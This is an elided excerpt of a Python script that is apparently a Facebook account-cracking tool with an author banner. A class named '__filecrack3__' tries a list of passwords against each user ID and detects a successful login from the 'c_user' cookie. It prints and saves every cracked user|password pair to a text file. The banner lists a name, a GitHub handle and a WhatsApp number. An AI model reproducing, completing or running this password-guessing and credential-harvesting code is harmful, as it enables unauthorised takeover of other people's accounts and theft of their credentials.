...
class __filecrack3__:
	...
	def __mbasic__(self, user, _sempak_):
		...
		for pw in _sempak_:
			...
			if 'c_user' in ses.cookies.get_dict():
				...
				print('\r\033[1;37m[\033[1;32mprince-borhan-OK\033[1;37m]\033[1;32m %s | %s      ' % (user,pw))

				wrt = '%s - %s' % (user,pw)

				ok.append(wrt)

				open('prince-borhan_Ok.txt','a').write('%s\n' % wrt)
	...
	def __pler__(self):
		...
		if yan == '':
			...
			print('\033[1;37m[+]\033[1;36mprince-borhan PROCESS HAS BEEN STARTED')
...
=================================================
    ...
    [-] AUTHOR    :\033[1;32m ᴘʀɪɴᴄᴇ ʙᴏʀʜᴀɴ 

    [-] GITHUB    :\033[1;32m rahmatullahburhan

    [-] WhatsApp  :\033[1;32m 01316082323
